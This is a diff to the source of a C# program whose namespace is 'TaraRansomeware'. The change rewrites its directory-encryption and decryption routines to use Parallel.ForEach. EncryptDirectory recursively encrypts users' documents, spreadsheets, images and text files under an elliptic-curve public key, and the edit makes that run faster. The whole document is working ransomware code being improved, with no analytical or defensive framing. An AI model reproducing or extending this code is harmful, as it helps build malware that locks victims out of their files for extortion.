@@ -4,6 +4,7 @@ using System;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
+using System.Threading.Tasks;
 using TaraRansomeware.Utilities;
 
 namespace TaraRansomeware.Engines
@@ -36,8 +37,7 @@ namespace TaraRansomeware.Engines
         /// <param name="location">文件夹位置</param>
         public void EncryptDirectory(ECPublicKeyParameters cipPubKey, string location)
         {
-            var validExtensions = new[]
-            {
+            string[] validExtensions = {
                 ".txt", ".md", ".tex", ".rst",
                 ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
                 ".jpg", ".png", ".psd",
@@ -48,20 +48,20 @@ namespace TaraRansomeware.Engines
             string[] files = Directory.GetFiles(location);
             string[] childDirectories = Directory.GetDirectories(location);
 
-            foreach (string filePath in files)
+            Parallel.ForEach(files, (filePath) =>
             {
                 string extension = Path.GetExtension(filePath);
                 if (validExtensions.Contains(extension))
                 {
-                    Debug.WriteLine(Path.GetFullPath(filePath));
                     EncryptFile(cipPubKey, Path.GetFullPath(filePath));
+                    Debug.WriteLine(Path.GetFullPath(filePath));
                 }
-            }
+            });
 
-            foreach (string subDir in childDirectories)
+            Parallel.ForEach(childDirectories, (subDir) =>
             {
                 EncryptDirectory(cipPubKey, Path.GetFullPath(subDir));
-            }
+            });
         }
 
         /// <summary>
@@ -75,7 +75,7 @@ namespace TaraRansomeware.Engines
             string[] childDirectories = Directory.GetDirectories(location);
             string validExtension = lockSuffix;
 
-            foreach (string filePath in files)
+            Parallel.ForEach(files, (filePath) =>
             {
                 string extension = Path.GetExtension(filePath);
                 if (extension == validExtension)
@@ -83,12 +83,12 @@ namespace TaraRansomeware.Engines
                     Console.WriteLine(Path.GetFullPath(filePath));
                     RestoreFile(cipPrivKey, Path.GetFullPath(filePath));
                 }
-            }
+            });
 
-            foreach (string subDir in childDirectories)
+            Parallel.ForEach(childDirectories, (subDir) =>
             {
                 DecryptDirectory(cipPrivKey, Path.GetFullPath(subDir));
-            }
+            });
         }
 
         /// <summary>
